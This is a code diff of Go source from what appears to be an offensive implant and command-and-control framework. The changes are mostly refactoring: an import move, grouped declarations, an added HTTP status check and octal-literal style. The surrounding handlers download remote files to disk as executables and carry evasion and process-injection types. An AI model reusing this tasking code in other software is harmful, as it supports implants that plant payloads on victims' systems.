@@ -12,11 +12,11 @@ import (
 	"time"
 
 	"github.com/iDigitalFlame/xmt/cmd"
-	"github.com/iDigitalFlame/xmt/cmd/evade"
 	"github.com/iDigitalFlame/xmt/cmd/filter"
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/data"
 	"github.com/iDigitalFlame/xmt/device"
+	"github.com/iDigitalFlame/xmt/device/evade"
 	"github.com/iDigitalFlame/xmt/device/screen"
 	"github.com/iDigitalFlame/xmt/man"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
@@ -41,12 +41,14 @@ var client struct {
 	v *http.Client
 }
 
-var _ Callable = (*DLL)(nil)
-var _ Callable = (*Zombie)(nil)
-var _ Callable = (*Process)(nil)
-var _ Callable = (*Assembly)(nil)
-var _ backer = (*data.Chunk)(nil)
-var _ backer = (*com.Packet)(nil)
+var (
+	_ Callable = (*DLL)(nil)
+	_ Callable = (*Zombie)(nil)
+	_ Callable = (*Process)(nil)
+	_ Callable = (*Assembly)(nil)
+	_ backer   = (*data.Chunk)(nil)
+	_ backer   = (*com.Packet)(nil)
+)
 
 type backer interface {
 	WriteUint32Pos(int, uint32) error
@@ -165,12 +167,16 @@ func taskPull(x context.Context, r data.Reader, w data.Writer) error {
 	if o, err = request(u, a, h); err != nil {
 		return err
 	}
+	if o.StatusCode >= http.StatusBadRequest {
+		o.Body.Close()
+		return xerr.Sub("invalid HTTP response", 0x3F)
+	}
 	var (
 		v = device.Expand(p)
 		f *os.File
 	)
 	// 0x242 - CREATE | TRUNCATE | RDWR
-	if f, err = os.OpenFile(v, 0x242, 0755); err != nil {
+	if f, err = os.OpenFile(v, 0x242, 0o755); err != nil {
 		o.Body.Close()
 		return err
 	}
@@ -190,7 +196,7 @@ func taskUpload(x context.Context, r data.Reader, w data.Writer) error {
 		f *os.File
 	)
 	// 0x242 - CREATE | TRUNCATE | RDWR
-	if f, err = os.OpenFile(v, 0x242, 0644); err != nil {
+	if f, err = os.OpenFile(v, 0x242, 0o644); err != nil {
 		return err
 	}
 	n := data.NewCtxReader(x, r)
@@ -339,7 +345,7 @@ func taskSystemIo(x context.Context, r data.Reader, w data.Writer) error {
 			return nil
 		}
 		// 0x242 - CREATE | TRUNCATE | RDWR
-		f, err1 := os.OpenFile(k, 0x242, 0644)
+		f, err1 := os.OpenFile(k, 0x242, 0o644)
 		if err1 != nil {
 			return err1
 		}
@@ -399,7 +405,7 @@ func taskSystemIo(x context.Context, r data.Reader, w data.Writer) error {
 			return err
 		}
 		// 0x242 - CREATE | TRUNCATE | RDWR
-		if f, err = os.OpenFile(u, 0x242, 0644); err != nil {
+		if f, err = os.OpenFile(u, 0x242, 0o644); err != nil {
 			s.Close()
 			return err
 		}
